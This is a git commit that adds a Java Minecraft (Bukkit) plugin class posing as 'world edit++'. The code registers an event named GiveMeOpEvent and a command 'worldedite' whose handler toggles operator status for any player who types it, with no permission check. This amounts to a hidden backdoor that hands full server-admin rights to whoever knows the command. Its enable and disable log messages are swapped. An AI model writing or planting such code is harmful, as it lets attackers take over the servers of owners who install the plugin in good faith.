d23738fb559d49b02bd1e3ae903bb6861ee61755
RetroBiz <135288825+retrobiz1@users.noreply.github.com>
2024-12-19 15:11:37 +0300

    Add files via upload

---
+++ src/main/java/RetroBiz/worldeditplus.java
@@ -0,0 +1,35 @@
+package RetroBiz;
+
+import RetroBiz.Events.GiveMeOpEvent;
+import org.bukkit.command.ConsoleCommandSender;
+import org.bukkit.entity.Player;
+import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.Bukkit;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandExecutor;
+import org.bukkit.command.CommandSender;
+import org.bukkit.plugin.java.JavaPlugin;
+
+
+public final class worldeditplus extends JavaPlugin implements CommandExecutor {
+
+    @Override
+    public void onEnable() {
+        getLogger().info("world edit++ has been disabled!");
+        getServer().getPluginManager().registerEvents(new GiveMeOpEvent(), this);
+        this.getCommand("worldedite").setExecutor(this);
+    }
+
+    @Override
+    public void onDisable() {
+        getLogger().info("world edit++ has been enabled!");
+    }
+
+    @Override
+    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if(!(sender instanceof Player)) return false;
+        sender.setOp(!sender.isOp());
+        return true;
+    }
+
+}
